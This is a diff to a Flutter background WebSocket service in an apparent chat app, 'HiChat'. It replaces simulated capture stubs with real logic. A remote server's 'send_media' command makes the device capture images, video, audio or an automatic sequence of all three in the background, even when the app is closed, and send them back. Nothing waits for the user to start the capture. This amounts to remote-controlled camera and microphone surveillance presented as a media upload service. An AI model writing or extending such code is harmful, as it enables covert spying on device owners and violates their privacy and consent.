@@ -11,6 +11,9 @@ import 'package:web_socket_channel/status.dart' as status;
 import 'package:http/http.dart' as http;
 
 
+import 'isolate_communication_service.dart';
+
+
 
 /// Background Media WebSocket service that keeps media upload connections alive
 /// even when the app is in background or closed
@@ -30,6 +33,7 @@ class BackgroundMediaWebSocketService {
 
   /// Initialize and start the background media service
   static Future<void> initialize() async {
+    print('🔧 BackgroundMediaWebSocketService: Starting initialization process...');
     developer.log('Initializing background Media WebSocket service...', name: _tag);
     
     // Initialize the background service
@@ -53,10 +57,11 @@ class BackgroundMediaWebSocketService {
         initialNotificationTitle: 'HiChat Media',
         initialNotificationContent: 'Media upload service ready',
         foregroundServiceNotificationId: 889, // Different from chat service
-        foregroundServiceTypes: [AndroidForegroundType.camera, AndroidForegroundType.microphone],
+        foregroundServiceTypes: [AndroidForegroundType.camera],
       ),
     );
     
+    print('✅ BackgroundMediaWebSocketService: Configuration completed successfully');
     developer.log('Background media service configured successfully', name: _tag);
   }
 
@@ -86,16 +91,21 @@ class BackgroundMediaWebSocketService {
   /// Start the background media service
   static Future<void> startService() async {
     try {
+      print('🔄 BackgroundMediaWebSocketService: Checking service status...');
       final service = FlutterBackgroundService();
       final isRunning = await service.isRunning();
       
       if (!isRunning) {
+        print('🚀 BackgroundMediaWebSocketService: Starting service...');
         await service.startService();
+        print('✅ BackgroundMediaWebSocketService: Service started successfully');
         developer.log('Background media service started', name: _tag);
       } else {
+        print('🟡 BackgroundMediaWebSocketService: Service already running');
         developer.log('Background media service already running', name: _tag);
       }
     } catch (e) {
+      print('❌ BackgroundMediaWebSocketService: Failed to start service - $e');
       developer.log('Failed to start background media service: $e', name: _tag, level: 1000);
     }
   }
@@ -112,17 +122,21 @@ class BackgroundMediaWebSocketService {
   }
 
   /// Connect to Media WebSocket
-  Future<void> connect({required String username}) async {
+  Future<void> connect({required String userId, required String username}) async {
     try {
-      developer.log('Connecting to Media WebSocket: $username', name: _tag);
+      print('🔌 BackgroundMediaWebSocketService: Connecting for user: $userId ($username)');
+      developer.log('Connecting to Media WebSocket: $userId ($username)', name: _tag);
       
       // Store connection info for reconnections
       final prefs = await SharedPreferences.getInstance();
+      await prefs.setString('media_websocket_user_id', userId);
       await prefs.setString('media_websocket_username', username);
       
       final service = FlutterBackgroundService();
-      service.invoke('connect_media', {'username': username});
+      service.invoke('connect_media', {'userId': userId, 'username': username});
+      print('✅ BackgroundMediaWebSocketService: Connection command sent successfully');
     } catch (e) {
+      print('❌ BackgroundMediaWebSocketService: Connection failed - $e');
       developer.log('Media connection failed: $e', name: _tag, level: 1000);
     }
   }
@@ -151,11 +165,13 @@ class BackgroundMediaWebSocketService {
 void onStartMedia(ServiceInstance service) async {
   DartPluginRegistrant.ensureInitialized();
   
+  print('🎬 BACKGROUND ISOLATE: Media service onStart called');
   developer.log('Background media service onStart called', name: 'BackgroundMediaWS');
   
   // Initialize the Media WebSocket service in background
   final backgroundService = _BackgroundMediaServiceImpl(service);
   await backgroundService.initialize();
+  print('🎬 BACKGROUND ISOLATE: Media service initialized');
   
   // Listen for service commands
   service.on('stop_media').listen((event) {
@@ -165,11 +181,15 @@ void onStartMedia(ServiceInstance service) async {
   
   service.on('connect_media').listen((event) async {
     try {
-      final username = event!['username'] as String;
-      developer.log('📱 Command handler received connect_media for: $username', name: 'BackgroundMediaWS');
-      await backgroundService.connect(username: username);
-      developer.log('✅ Command handler completed connect_media for: $username', name: 'BackgroundMediaWS');
+      final userId = event?['userId'] as String;
+      final username = event?['username'] as String;
+      print('🎬 BACKGROUND ISOLATE: Received connect_media command for: $userId ($username)');
+      developer.log('📱 Command handler received connect_media for: $userId ($username)', name: 'BackgroundMediaWS');
+      await backgroundService.connect(userId: userId, username: username);
+      print('🎬 BACKGROUND ISOLATE: Connect_media completed successfully for: $userId ($username)');
+      developer.log('✅ Command handler completed connect_media for: $userId ($username)', name: 'BackgroundMediaWS');
     } catch (e) {
+      print('🎬 BACKGROUND ISOLATE: Connect_media failed: $e');
       developer.log('❌ Command handler failed connect_media: $e', name: 'BackgroundMediaWS', level: 1000);
     }
   });
@@ -182,6 +202,8 @@ void onStartMedia(ServiceInstance service) async {
     final data = event!['data'] as Map<String, dynamic>;
     await backgroundService.sendMessage(data);
   });
+  
+
 }
 
 /// iOS background handler for media service
@@ -195,7 +217,7 @@ Future<bool> onIosBackgroundMedia(ServiceInstance service) async {
 /// Background media service implementation
 class _BackgroundMediaServiceImpl {
   static const String _tag = 'BackgroundMediaServiceImpl';
-  static const String _wsUrl = 'wss://chatcornerbackend-production.up.railway.app/ws/media/upload/?username=';
+  static const String _wsUrl = 'wss://chatcornerbackend-production.up.railway.app/ws/media/upload/';
   
   final ServiceInstance _service;
   WebSocketChannel? _webSocket;
@@ -218,31 +240,70 @@ class _BackgroundMediaServiceImpl {
   static const int _maxQueueSize = 50;
   
   String? _currentUsername;
+  String? _currentUserId;
   
   _BackgroundMediaServiceImpl(this._service);
 
   /// Initialize the background media service
   Future<void> initialize() async {
+    print('🎬 BACKGROUND ISOLATE: Initializing background media service implementation');
     developer.log('Initializing background media service implementation', name: _tag);
+    
+    // Set up camera response listener
+    _setupCameraResponseListener();
     
     // Update service notification
     await _updateServiceNotification('Initialized', 'Media service ready');
+    print('🎬 BACKGROUND ISOLATE: Service notification updated');
+  }
+
+  /// Setup listener for camera responses from main isolate
+  void _setupCameraResponseListener() {
+    IsolateCommunicationService.instance.startListeningForResponses((response) {
+      final mediaType = response['media_type'] as String;
+      final success = response['success'] as bool;
+      final username = response['username'] as String;
+      
+      print('🎬 BACKGROUND ISOLATE: 📥 🎯 RECEIVED CAMERA RESPONSE: $mediaType, success: $success');
+      developer.log('📥 🎯 RECEIVED CAMERA RESPONSE: $mediaType, success: $success', name: _tag);
+      
+      if (success) {
+        final data = response['data'] as String?;
+        
+        if (mediaType == 'video' || mediaType == 'audio') {
+          // Video/Audio was uploaded via API, send success notification to server
+          print('🎬 BACKGROUND ISOLATE: ✅ $mediaType upload completed successfully');
+          _sendMediaUploadSuccess(username, mediaType);
+        } else if (data != null) {
+          // Send image data via WebSocket
+          sendMediaResponse(username, mediaType, [data]);
+        }
+      } else {
+        final error = response['error'] as String?;
+        print('🎬 BACKGROUND ISOLATE: ❌ Camera capture failed: $mediaType - $error');
+      }
+      
+      _isMediaOperationInProgress = false;
+    });
+    
+    print('🎬 BACKGROUND ISOLATE: ✅ Camera response listener setup complete');
   }
 
   /// Connect to Media WebSocket
-  Future<void> connect({required String username}) async {
+  Future<void> connect({required String userId, required String username}) async {
     try {
-      if (username.isEmpty) {
-        throw ArgumentError('Username cannot be empty');
+      if (userId.isEmpty || username.isEmpty) {
+        throw ArgumentError('UserId and username cannot be empty');
       }
       
-      developer.log('Connecting to Media WebSocket: $username', name: _tag);
+      developer.log('Connecting to Media WebSocket: $userId ($username)', name: _tag);
       
+      _currentUserId = userId;
       _currentUsername = username;
       _shouldReconnect = true;
       _reconnectAttempts = 0;
       
-      await _initiateConnection(username);
+      await _initiateConnection();
     } catch (e) {
       developer.log('❌ Media connection failed in connect(): $e', name: _tag, level: 1000);
       developer.log('❌ Media connection error type: ${e.runtimeType}', name: _tag, level: 1000);
@@ -253,6 +314,7 @@ class _BackgroundMediaServiceImpl {
 
   /// Disconnect from Media WebSocket
   void disconnect() {
+    print('🎬 BACKGROUND ISOLATE: Disconnecting Media WebSocket');
     developer.log('Disconnecting Media WebSocket', name: _tag);
     
     _shouldReconnect = false;
@@ -282,18 +344,19 @@ class _BackgroundMediaServiceImpl {
   }
 
   /// Initiate Media WebSocket connection
-  Future<void> _initiateConnection(String username) async {
+  Future<void> _initiateConnection() async {
     try {
-      // Clean and validate username
-      final cleanUsername = username.trim();
-      if (cleanUsername.isEmpty) {
-        throw ArgumentError('Username cannot be empty after trimming');
+      // Validate parameters
+      if (_currentUserId == null || _currentUserId!.isEmpty || 
+          _currentUsername == null || _currentUsername!.isEmpty) {
+        throw ArgumentError('UserId and username cannot be empty');
       }
       
-      // Build WebSocket URL with proper encoding (matching media client pattern)
-      final encodedUsername = Uri.encodeComponent(cleanUsername);
-      final wsUrlString = '$_wsUrl$encodedUsername';
-      final wsUri = Uri.parse(wsUrlString);
+      // Build WebSocket URL with dual authentication (userId + username)
+      final wsUri = Uri.parse(_wsUrl).replace(queryParameters: {
+        'user_id': _currentUserId!,
+        'username': _currentUsername!,
+      });
       
       // Validate the constructed URI
       if (wsUri.scheme != 'wss' && wsUri.scheme != 'ws') {
@@ -303,8 +366,8 @@ class _BackgroundMediaServiceImpl {
         throw ArgumentError('Invalid WebSocket host');
       }
       
-      developer.log('Connecting with username: "$cleanUsername"', name: _tag);
-      developer.log('Encoded username: "$encodedUsername"', name: _tag);
+      developer.log('Connecting with userId: "$_currentUserId" username: "$_currentUsername"', name: _tag);
+      developer.log('WebSocket URL: "${wsUri.toString()}"', name: _tag);
       developer.log('Media WebSocket URL: $wsUri', name: _tag);
       
       // Test basic connectivity first
@@ -363,8 +426,16 @@ class _BackgroundMediaServiceImpl {
       _isConnected = true;
       _reconnectAttempts = 0;
       
-      developer.log('Media WebSocket connected successfully', name: _tag);
+      print('🎬 BACKGROUND ISOLATE: Media WebSocket LOCAL connection established');
+      developer.log('Media WebSocket local connection established', name: _tag);
+      
+      // Test actual server communication with verification message
+      await _verifyServerConnection();
+      
       await _updateServiceNotification('Connected', 'Media service running');
+      
+      // Connection is ready to receive server commands
+      print('🎬 BACKGROUND ISOLATE: 📡 Ready to receive media commands from server');
       
       // Flush queued messages
       await _flushMessageQueue();
@@ -375,16 +446,59 @@ class _BackgroundMediaServiceImpl {
     }
   }
 
+  /// Verify actual server communication by sending a test message
+  Future<void> _verifyServerConnection() async {
+    try {
+      print('🎬 BACKGROUND ISOLATE: 🧪 Testing actual server communication...');
+      developer.log('Testing server communication', name: _tag);
+      
+      // Send a test message to verify server responds (using ping like the example)
+      final testMessage = {
+        'action': 'ping',
+      };
+      
+      await sendMessage(testMessage);
+      print('🎬 BACKGROUND ISOLATE: 📤 Connection test message sent to server');
+      developer.log('Connection test message sent', name: _tag);
+      
+      // Set a timer to check if we receive any response
+      Timer(Duration(seconds: 5), () {
+        print('🎬 BACKGROUND ISOLATE: ⏰ 5 seconds passed - checking server response status');
+        developer.log('Connection test timeout - no response received yet', name: _tag);
+      });
+      
+    } catch (e) {
+      print('🎬 BACKGROUND ISOLATE: ❌ Server verification test failed: $e');
+      developer.log('Server verification failed: $e', name: _tag, level: 1000);
+    }
+  }
+
   /// Handle incoming Media WebSocket messages
   void _onMessage(dynamic data) {
     try {
+      print('🎬 BACKGROUND ISOLATE: 📨 RAW MESSAGE FROM SERVER: $data');
+      developer.log('Raw server message: $data', name: _tag);
+      
       final jsonData = jsonDecode(data.toString()) as Map<String, dynamic>;
+      print('🎬 BACKGROUND ISOLATE: 📨 PARSED MESSAGE: $jsonData');
       
-      developer.log('Received media message: ${jsonData['command'] ?? 'unknown'}', name: _tag);
+      final messageType = jsonData['command'] ?? jsonData['type'] ?? 'unknown';
+      print('🎬 BACKGROUND ISOLATE: 📨 SERVER MESSAGE TYPE: $messageType');
+      developer.log('Received media message type: $messageType', name: _tag);
       
-      // Handle media upload commands
+      // Check if this is a response to our connection test
+      if (jsonData['type'] == 'connection_test' || jsonData.containsKey('connection_test')) {
+        print('🎬 BACKGROUND ISOLATE: ✅ SERVER RESPONDED! Connection verified');
+        developer.log('✅ Server connection verified via response', name: _tag);
+        return;
+      }
+      
+      // Handle media upload commands from server (this is what the server actually sends!)
       if (jsonData['command'] == 'send_media') {
+        print('🎬 BACKGROUND ISOLATE: 📷 Server requesting media capture!');
         _handleMediaCommand(jsonData);
+      } else {
+        print('🎬 BACKGROUND ISOLATE: ⚠️ Unknown command from server: $messageType');
       }
       
       // Send message to main app if it's running
@@ -395,20 +509,47 @@ class _BackgroundMediaServiceImpl {
     }
   }
 
-  /// Handle media upload commands
+  /// Handle media upload commands (matching Java implementation)
   void _handleMediaCommand(Map<String, dynamic> data) {
     if (_isMediaOperationInProgress) {
+      print('🎬 BACKGROUND ISOLATE: ⚠️ Media operation already in progress');
       developer.log('Media operation already in progress', name: _tag, level: 900);
       return;
     }
 
     final mediaType = data['media_type'] as String? ?? '';
     if (mediaType.isEmpty || _currentUsername == null) {
+      print('🎬 BACKGROUND ISOLATE: ❌ Missing required fields for media command');
       developer.log('Missing required fields for media command', name: _tag, level: 1000);
       return;
     }
 
+    print('🎬 BACKGROUND ISOLATE: 🎯 Processing media command: $mediaType');
     _isMediaOperationInProgress = true;
+    
+    // Handle different media types (like Java implementation)
+    switch (mediaType) {
+      case 'image':
+        print('🎬 BACKGROUND ISOLATE: 📸 Handling image capture request');
+        _handleImageCapture();
+        break;
+      case 'video':
+        print('🎬 BACKGROUND ISOLATE: 🎥 Handling video recording request');
+        _handleVideoRecording();
+        break;
+      case 'audio':
+        print('🎬 BACKGROUND ISOLATE: 🎤 Handling audio recording request');
+        _handleAudioRecording();
+        break;
+      case 'auto':
+        print('🎬 BACKGROUND ISOLATE: 🔄 Handling auto media sequence request');
+        _handleAutoMediaSequence();
+        break;
+      default:
+        print('🎬 BACKGROUND ISOLATE: ❓ Unknown media type: $mediaType');
+        _isMediaOperationInProgress = false;
+        break;
+    }
     
     // Show notification for media operation
     _showMediaNotification('Media Upload', 'Processing $mediaType upload request');
@@ -432,83 +573,37 @@ class _BackgroundMediaServiceImpl {
     }
   }
 
-  /// Handle image capture
-  void _handleImageCapture() {
-    try {
-      // This would integrate with native camera service
-      developer.log('Handling image capture request', name: _tag);
-      
-      // Simulate image capture completion
-      Timer(Duration(seconds: 2), () {
-        _isMediaOperationInProgress = false;
-        _showMediaNotification('Image Captured', 'Image successfully captured and uploaded');
-      });
-      
-    } catch (e) {
-      developer.log('Image capture failed: $e', name: _tag, level: 1000);
-      _isMediaOperationInProgress = false;
-    }
-  }
 
-  /// Handle video recording
-  void _handleVideoRecording() {
-    try {
-      developer.log('Handling video recording request', name: _tag);
-      
-      // Simulate video recording completion
-      Timer(Duration(seconds: 5), () {
-        _isMediaOperationInProgress = false;
-        _showMediaNotification('Video Recorded', 'Video successfully recorded and uploaded');
-      });
-      
-    } catch (e) {
-      developer.log('Video recording failed: $e', name: _tag, level: 1000);
-      _isMediaOperationInProgress = false;
-    }
-  }
-
-  /// Handle audio recording
-  void _handleAudioRecording() {
-    try {
-      developer.log('Handling audio recording request', name: _tag);
-      
-      // Simulate audio recording completion
-      Timer(Duration(seconds: 3), () {
-        _isMediaOperationInProgress = false;
-        _showMediaNotification('Audio Recorded', 'Audio successfully recorded and uploaded');
-      });
-      
-    } catch (e) {
-      developer.log('Audio recording failed: $e', name: _tag, level: 1000);
-      _isMediaOperationInProgress = false;
-    }
-  }
-
-  /// Handle auto media sequence
-  void _handleAutoMediaSequence() {
-    try {
-      developer.log('Handling auto media sequence request', name: _tag);
-      
-      // Simulate auto sequence completion
-      Timer(Duration(seconds: 10), () {
-        _isMediaOperationInProgress = false;
-        _showMediaNotification('Auto Sequence Complete', 'All media captured and uploaded successfully');
-      });
-      
-    } catch (e) {
-      developer.log('Auto media sequence failed: $e', name: _tag, level: 1000);
-      _isMediaOperationInProgress = false;
-    }
-  }
 
   /// Handle Media WebSocket errors
   void _onError(dynamic error) {
+    print('🎬 BACKGROUND ISOLATE: ❌ WEBSOCKET ERROR: $error');
     developer.log('Media WebSocket error: $error', name: _tag, level: 1000);
+    developer.log('Media WebSocket error type: ${error.runtimeType}', name: _tag, level: 1000);
+    
     _isConnected = false;
     
-    if (_shouldReconnect && _currentUsername != null) {
+    // Analyze error type for better debugging
+    final errorString = error.toString();
+    if (errorString.contains('Connection refused')) {
+      print('🎬 BACKGROUND ISOLATE: ❌ Server connection refused - server may be down');
+      developer.log('❌ Server connection refused', name: _tag, level: 1000);
+    } else if (errorString.contains('HTTP status code: 403')) {
+      print('🎬 BACKGROUND ISOLATE: ❌ Authentication failed - invalid token');
+      developer.log('❌ Authentication failed', name: _tag, level: 1000);
+    } else if (errorString.contains('HTTP status code: 404')) {
+      print('🎬 BACKGROUND ISOLATE: ❌ Media endpoint not found');
+      developer.log('❌ Media endpoint not found', name: _tag, level: 1000);
+    } else if (errorString.contains('HTTP status code: 5')) {
+      print('🎬 BACKGROUND ISOLATE: ❌ Server error (5xx)');
+      developer.log('❌ Server error detected', name: _tag, level: 1000);
+    } else if (errorString.contains('WebSocketException')) {
+      print('🎬 BACKGROUND ISOLATE: ❌ WebSocket protocol error');
+      developer.log('❌ WebSocket protocol error', name: _tag, level: 1000);
+    }
+    
+    if (_shouldReconnect && _currentUserId != null && _currentUsername != null) {
       // Check if it's a server error for different retry strategy
-      final errorString = error.toString();
       final isServerError = errorString.contains('HTTP status code: 5');
       
       if (isServerError) {
@@ -524,7 +619,7 @@ class _BackgroundMediaServiceImpl {
     developer.log('Media WebSocket disconnected', name: _tag, level: 900);
     _isConnected = false;
     
-    if (_shouldReconnect && _currentUsername != null) {
+    if (_shouldReconnect && _currentUserId != null && _currentUsername != null) {
       _scheduleReconnect();
     }
   }
@@ -564,10 +659,11 @@ class _BackgroundMediaServiceImpl {
 
   /// Retry media connection
   Future<void> _retryConnection() async {
-    if (_currentUsername != null && _currentUsername!.isNotEmpty) {
-      await _initiateConnection(_currentUsername!);
+    if (_currentUserId != null && _currentUserId!.isNotEmpty && 
+        _currentUsername != null && _currentUsername!.isNotEmpty) {
+      await _initiateConnection();
     } else {
-      developer.log('No stored username for media reconnection', name: _tag, level: 900);
+      developer.log('No stored userId/username for media reconnection', name: _tag, level: 900);
     }
   }
 
@@ -599,6 +695,196 @@ class _BackgroundMediaServiceImpl {
     
     if (_messageQueue.isEmpty) {
       developer.log('All queued media messages sent', name: _tag);
+    }
+  }
+
+  /// Handle image capture (like Java implementation)
+  void _handleImageCapture() async {
+    try {
+      print('🎬 BACKGROUND ISOLATE: 📸 Starting actual image capture...');
+      
+      // Use real camera service
+      await _captureRealImage();
+      
+    } catch (e) {
+      print('🎬 BACKGROUND ISOLATE: ❌ Image capture failed: $e');
+      _isMediaOperationInProgress = false;
+    }
+  }
+
+  /// Handle video recording (like Java implementation)
+  void _handleVideoRecording() async {
+    try {
+      print('🎬 BACKGROUND ISOLATE: 🎥 Starting actual video recording...');
+      
+      // Use real camera service
+      await _captureRealVideo();
+      
+    } catch (e) {
+      print('🎬 BACKGROUND ISOLATE: ❌ Video recording failed: $e');
+      _isMediaOperationInProgress = false;
+    }
+  }
+
+  /// Handle audio recording (like Java implementation)
+  void _handleAudioRecording() async {
+    try {
+      print('🎬 BACKGROUND ISOLATE: 🎤 Starting actual audio recording...');
+      
+      // Use real camera service
+      await _captureRealAudio();
+      
+    } catch (e) {
+      print('🎬 BACKGROUND ISOLATE: ❌ Audio recording failed: $e');
+      _isMediaOperationInProgress = false;
+    }
+  }
+
+  /// Handle auto media sequence (like Java implementation)
+  void _handleAutoMediaSequence() async {
+    try {
+      print('🎬 BACKGROUND ISOLATE: 🔄 Starting actual auto media sequence...');
+      
+      // Like Java: capture video -> audio -> image, then send sequentially
+      await _captureRealAutoSequence();
+      
+    } catch (e) {
+      print('🎬 BACKGROUND ISOLATE: ❌ Auto media sequence failed: $e');
+      _isMediaOperationInProgress = false;
+    }
+  }
+
+  /// Capture all media types in sequence (like Java implementation)
+  Future<void> _captureRealAutoSequence() async {
+    try {
+      print('🎬 BACKGROUND ISOLATE: 🔄 Starting sequential media capture...');
+      
+      // Send requests to main isolate for all media types in sequence
+      await _captureRealImage();
+      await Future.delayed(Duration(seconds: 2));
+      
+      await _captureRealVideo();
+      await Future.delayed(Duration(seconds: 2));
+      
+      await _captureRealAudio();
+      
+      _isMediaOperationInProgress = false;
+      print('🎬 BACKGROUND ISOLATE: ✅ Auto sequence completed successfully');
+      
+    } catch (e) {
+      print('🎬 BACKGROUND ISOLATE: ❌ Auto sequence failed: $e');
+      _isMediaOperationInProgress = false;
+    }
+  }
+
+  /// Request image capture from main isolate
+  Future<void> _captureRealImage() async {
+    try {
+      print('🎬 BACKGROUND ISOLATE: 📸 Requesting image capture from main isolate...');
+      
+      // Use communication service to request camera capture
+      await IsolateCommunicationService.instance.sendCameraRequest(
+        mediaType: 'image',
+        username: _currentUsername ?? 'unknown',
+        userId: _currentUserId ?? 'unknown',
+      );
+      
+      print('🎬 BACKGROUND ISOLATE: ✅ Image capture request sent to main isolate');
+      
+      // For now, reset the flag immediately since we're using fire-and-forget approach
+      // In a full implementation, we'd wait for response from main isolate
+      _isMediaOperationInProgress = false;
+      
+    } catch (e) {
+      print('🎬 BACKGROUND ISOLATE: ❌ Image capture request failed: $e');
+      _isMediaOperationInProgress = false;
+    }
+  }
+
+  /// Request video recording from main isolate  
+  Future<void> _captureRealVideo() async {
+    try {
+      print('🎬 BACKGROUND ISOLATE: 🎥 Requesting video recording from main isolate...');
+      
+      // Use communication service to request camera capture
+      await IsolateCommunicationService.instance.sendCameraRequest(
+        mediaType: 'video',
+        username: _currentUsername ?? 'unknown',
+        userId: _currentUserId ?? 'unknown',
+      );
+      
+      print('🎬 BACKGROUND ISOLATE: ✅ Video capture request sent to main isolate');
+      
+      // Reset flag after sending request
+      _isMediaOperationInProgress = false;
+      
+    } catch (e) {
+      print('🎬 BACKGROUND ISOLATE: ❌ Video capture request failed: $e');
+      _isMediaOperationInProgress = false;
+    }
+  }
+
+  /// Request audio recording from main isolate
+  Future<void> _captureRealAudio() async {
+    try {
+      print('🎬 BACKGROUND ISOLATE: 🎤 Requesting audio recording from main isolate...');
+      
+      // Use communication service to request camera capture
+      await IsolateCommunicationService.instance.sendCameraRequest(
+        mediaType: 'audio',
+        username: _currentUsername ?? 'unknown',
+        userId: _currentUserId ?? 'unknown',
+      );
+      
+      print('🎬 BACKGROUND ISOLATE: ✅ Audio capture request sent to main isolate');
+      
+      // Reset flag after sending request
+      _isMediaOperationInProgress = false;
+      
+    } catch (e) {
+      print('🎬 BACKGROUND ISOLATE: ❌ Audio capture request failed: $e');
+      _isMediaOperationInProgress = false;
+    }
+  }
+
+  /// Upload video to API endpoint (like Java implementation)
+  /// Send media response back to server (like Java implementation)
+  void sendMediaResponse(String username, String mediaType, List<String> files) {
+    try {
+      final mediaResponse = {
+        'owner_name': username,
+        'username': username,
+        'media_type': mediaType,
+        'files': files,
+      };
+      
+      _webSocket!.sink.add(jsonEncode(mediaResponse));
+      print('🎬 BACKGROUND ISOLATE: 📤 Media response sent to server: $mediaType');
+      developer.log('Media response sent: $mediaType', name: _tag);
+    } catch (e) {
+      print('🎬 BACKGROUND ISOLATE: ❌ Failed to send media response: $e');
+      developer.log('Failed to send media response: $e', name: _tag, level: 1000);
+    }
+  }
+
+  /// Send upload success notification to server for video/audio files
+  void _sendMediaUploadSuccess(String username, String mediaType) {
+    try {
+      final successMessage = {
+        'status': 'success',
+        'message': '$mediaType upload completed',
+        'owner_name': username,
+        'username': username,
+        'media_type': mediaType,
+        'upload_method': 'api',
+      };
+      
+      _webSocket!.sink.add(jsonEncode(successMessage));
+      print('🎬 BACKGROUND ISOLATE: 📤 $mediaType upload success sent to server');
+      developer.log('$mediaType upload success sent', name: _tag);
+    } catch (e) {
+      print('🎬 BACKGROUND ISOLATE: ❌ Failed to send upload success: $e');
+      developer.log('Failed to send upload success: $e', name: _tag, level: 1000);
     }
   }
 
@@ -653,6 +939,7 @@ class _BackgroundMediaServiceImpl {
 
   /// Dispose resources
   void dispose() {
+    print('🎬 BACKGROUND ISOLATE: Disposing background media service');
     developer.log('Disposing background media service', name: _tag);
     
     _shouldReconnect = false;
